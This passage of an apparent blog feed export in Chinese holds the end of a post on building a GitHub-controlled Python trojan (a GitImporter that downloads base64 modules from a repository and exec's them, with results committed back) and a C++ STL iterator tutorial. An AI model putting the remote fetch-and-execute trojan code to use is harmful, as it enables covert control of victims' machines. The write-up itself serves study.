keyword\">not</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            self<span class=\"token punctuation\">.</span>current_module_code <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>new_library<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">return</span> self</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">load_module</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        spec <span class=\"token operator\">=</span> importlib<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>spec_from_loader<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> loader<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> origin<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">.</span>git_url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        new_module <span class=\"token operator\">=</span> importlib<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>module_from_spec<span class=\"token punctuation\">(</span>spec<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>current_module_code<span class=\"token punctuation\">,</span> new_module<span class=\"token punctuation\">.</span>__dict__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span>spec<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> new_module</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> new_module</pre></td></tr></table></figure><p>每当解释器尝试加载一个不存在的模块时，都会调用 GitImporter 类。<br />\n首先，解释器会调用  <code>find_module</code>  函数尝试找到这个模块，我们将这个调用交给远程加载器来处理。如果在仓库中找到这个文件，就将其中的代码以 base64 解码， 存储到我们的类里（GitHub 给我们的数据默认是 Base64 编码的）。<br />\n接着返回  <code>self</code>  ，告知解释器找到了这个模块，而且解释器可以调用  <code>self</code>  的  <code>load_module</code>  函数来实际加载模块。在这个函数里，我们调用 Python 原生的 importlib 库创建了一个空白的模块对象，并将我们从 GitHub 上拉取到的代码填进去。</p>\n</div></details>\n<h3 id=\"第六步\"><a class=\"anchor\" href=\"#第六步\">#</a> 第六步</h3>\n<details class=\"info\"><summary>执行代码</summary><div>\n<p>最后我们将新创建的模块插入 sys.modules 列表，这样未来的任何 import 语句都能直接找到它。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\"># 将 GitImporter 添加到 sys.meta_path 列表中</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    sys<span class=\"token punctuation\">.</span>meta_path<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>GitImporter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># 创建木马对象</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    trojan <span class=\"token operator\">=</span> Trojan<span class=\"token punctuation\">(</span><span class=\"token string\">'abc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\"># 调用 run 函数</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    trojan<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>执行结果：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到它连接上了仓库，读取了配置文件，拉取了配置文件中设定的两个模块，并且运行了它们。</p>\n</div></details>\n<h2 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>最后在木马文件夹中执行：  <code>git pull origin master</code>  把在仓库中  <code>data</code>  目录下的数据拉取回来。</p>\n<p><strong>在 Windows 上拉取会报一些莫名其妙的错误。</strong></p>\n<p>可以在 GitHub 上看到木马提交了两个模块的执行结果。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>后面也可以对核心的 C&amp;C 机制进行若干改进。例如，自动化整个拉取数据、更新配置和发布木马的流程。</p>\n",
            "tags": [
                "BHP",
                "Python的import功能",
                "木马"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/STL/STL%E8%BF%AD%E4%BB%A3%E5%99%A8/",
            "url": "https://or0kit.github.io/Programming/STL/STL%E8%BF%AD%E4%BB%A3%E5%99%A8/",
            "title": "STL迭代器",
            "date_published": "2022-04-28T02:53:10.000Z",
            "content_html": "<h1 id=\"stl迭代器\"><a class=\"anchor\" href=\"#stl迭代器\">#</a> STL 迭代器</h1>\n<p>接着学习 STL 迭代器。</p>\n<h2 id=\"stl迭代器简介\"><a class=\"anchor\" href=\"#stl迭代器简介\">#</a> STL 迭代器简介</h2>\n<ol>\n<li>STL 迭代器用于指向容器中的一个元素，有  <code>const</code>  迭代器和非  <code>const</code>  迭代器两种；</li>\n<li>通过迭代器可以读取它指向的元素，通过非常量迭代器还能修改其指向的元素，迭代器用法和指针类似；</li>\n<li>迭代器是容器和算法的桥梁，STL 容器和算法是分离的，连接它们的是迭代器。</li>\n</ol>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<ol start=\"4\">\n<li>定义一个容器类的迭代器的方法可以是：</li>\n</ol>\n<blockquote>\n<p><code>容器类名::iterator 变量名</code> ， 如  <code>vector&lt;int&gt;::iterator vIt</code> <br />\n <code>容器类名::const_iterator 变量名</code> ， 如  <code>vector&lt;int&gt;::const_iterator vIt</code></p>\n</blockquote>\n<ol start=\"5\">\n<li>访问一个迭代器指向的元素</li>\n</ol>\n<p><code>*迭代器变量名</code></p>\n<ol start=\"6\">\n<li>不同容器上支持的迭代器功能强弱有所不同，容器的迭代器的功能强弱决定了该容器是否支持 STL 中的某种算法。</li>\n</ol>\n<p>例如： STL 通用的排序算法需要通过随机迭代器来访问容器中的元素，那么 list 容器不支持随机存储就 不能用这个函数，只能用自带的排序函数排序。</p>\n<ol start=\"7\">\n<li>迭代器按功能由弱到强分为 5 种</li>\n</ol>\n<blockquote>\n<p>1 &gt; 输入：Input iterators 提供对数据的只读访问；<br />\n1 &gt; 输出：Output iterators 提供对数据的只写访问；<br />\n2 &gt; 正向：Forward iterators 提供读写操作，并能向前推进迭代器；<br />\n3&gt; 双向：Bidirectional iterators 提供读写操作，并能向前和向后操作；<br />\n4 &gt; 随机：Random access iterators 提供读写操作，并能在数据中随机移动。</p>\n</blockquote>\n<p>标号大的迭代器拥有编号小的迭代器的功能，能当编号小的迭代器使用。</p>\n<ol start=\"8\">\n<li>不同的迭代器所能进行的操作</li>\n</ol>\n<p>所有迭代器：前后自增（p++ / ++p）</p>\n<p>输入迭代器：访问（*p）、赋值（p=p1）、判断（p==p1 /p!=p1）</p>\n<p>输出迭代器：访问（*p）、赋值（p=p1）</p>\n<p>正向迭代器：上面全部</p>\n<p>双向迭代器：上面全部，前后自减（p-- /--p）</p>\n<p>随机访问迭代器：上面全部，以及如下方式：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>p+&#x3D;i;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>p-&#x3D;i;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p+i;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p-i;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p[i];</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p&lt;p1;</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p&lt;&#x3D;p1;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p&gt;p1;</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p&gt;&#x3D;p1;</pre></td></tr></table></figure><p>算法会要求使用某些迭代器，例如  <code>sort()</code>  函数要求使用随机迭代器：</p>\n<p><code>template&lt; class RandomIt &gt; void sort( RandomIt first, RandomIt last );</code></p>\n<p>容器所支持的迭代器类别：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">容器</th>\n<th style=\"text-align:left\">迭代器类别</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">vector</td>\n<td style=\"text-align:left\">随机</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">deque</td>\n<td style=\"text-align:left\">随机</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">list</td>\n<td style=\"text-align:left\">双向</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">set/multiset</td>\n<td style=\"text-align:left\">双向</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">map/multimap</td>\n<td style=\"text-align:left\">双向</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">stack</td>\n<td style=\"text-align:left\">不支持迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">queue</td>\n<td style=\"text-align:left\">不支持迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">priority_queue</td>\n<td style=\"text-align:left\">不支持迭代器</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"迭代器的常见操作\"><a class=\"anchor\" href=\"#迭代器的常见操作\">#</a> 迭代器的常见操作</h2>\n<p>迭代器的常见操作：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">Itertaor_Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> nArr<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span><span class=\"token number\">33</span><span class=\"token punctuation\">,</span><span class=\"token number\">44</span><span class=\"token punctuation\">,</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">66</span><span class=\"token punctuation\">,</span><span class=\"token number\">77</span><span class=\"token punctuation\">,</span><span class=\"token number\">88</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v1</span><span class=\"token punctuation\">(</span>nArr<span class=\"token punctuation\">,</span> nArr <span class=\"token operator\">+</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"遍历容器v1:\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> v1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"  \"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 初始化非常量迭代器</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\">// 初始化常量迭代器</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>const_iterator cvit <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">cbegin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"非常量迭代器 *vit:\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"常量迭代器 *cvit:\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>cvit <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"常量迭代器cvit.operator*():\"</span> <span class=\"token operator\">&lt;&lt;</span> cvit<span class=\"token punctuation\">.</span><span class=\"token keyword\">operator</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token comment\">// 接下来比较迭代器的大小</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit1 <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit2 <span class=\"token operator\">=</span> vit1<span class=\"token punctuation\">.</span><span class=\"token keyword\">operator</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit3 <span class=\"token operator\">=</span> vit1<span class=\"token operator\">+</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit4 <span class=\"token operator\">=</span> vit2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    vit4 <span class=\"token operator\">+=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator vit5 <span class=\"token operator\">=</span> vit3<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    vit5<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit1:vit2:vit3:vit4:vit5:\\t\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit1 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit2 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit3 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit4 <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\":\"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>vit5 <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token comment\">// 比较迭代器</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"比较迭代器\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit1<span class=\"token operator\">></span>vit2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit1>vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit1&lt;vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit3 <span class=\"token operator\">==</span> vit2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit3=vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit3!=vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit4 <span class=\"token operator\">></span> vit2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit4>vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit4&lt;vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>vit5 <span class=\"token operator\">></span> vit2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit5>vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token keyword\">else</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>        cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"vit5&lt;vit2\"</span> <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果如下：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>遍历容器 v1:11  22  33  44  55  66  77  88  99</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>非常量迭代器 *vit:11</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>常量迭代器 *cvit:11</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>常量迭代器 cvit.operator*():11</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>打印迭代器的值： vit1:vit2:vit3:vit4:vit5:      11:77:77:99:66</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 比较迭代器 &#x3D;&#x3D;&#x3D;&#x3D;]</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>vit1&lt;vit2</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>vit3&#x3D;vit2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>vit4&gt;vit2</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>vit5&lt;vit2</pre></td></tr></table></figure><h1 id=\"在容器中使用自定义对象\"><a class=\"anchor\" href=\"#在容器中使用自定义对象\">#</a> 在容器中使用自定义对象</h1>\n<p>在 STL 中使用自定义对象有一下两种情况：</p>\n<p>1. 向 Vector、Deque、List、Stack、Queue 容器中添加自定义对象，实际是将对象复制一份放到容器里，要调用对象的拷贝函数时，如果定义了拷贝函数则调用定义的拷贝函数，如果没定义则调用默认的拷贝函数；</p>\n<p>2. 向 Set 和 Map 容器中添加自定义对象也是将对象复制一份放到容器了，不同的是：Set 和 Map 容器添加自定义对象的时候要实现比较器函数。</p>\n<h2 id=\"代码实现\"><a class=\"anchor\" href=\"#代码实现\">#</a> 代码实现</h2>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// STL-CustomObject.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;vector></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;algorithm></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;string></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token function\">Person</span><span class=\"token punctuation\">(</span>string name<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> age<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">this</span><span class=\"token operator\">-></span>m_Name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t<span class=\"token keyword\">this</span><span class=\"token operator\">-></span>m_Age <span class=\"token operator\">=</span> age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tstring m_Name<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token keyword\">int</span> m_Age<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">void</span> <span class=\"token function\">Print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Name: \"</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token keyword\">this</span><span class=\"token operator\">-></span>m_Name <span class=\"token operator\">&lt;&lt;</span> endl<span class=\"token 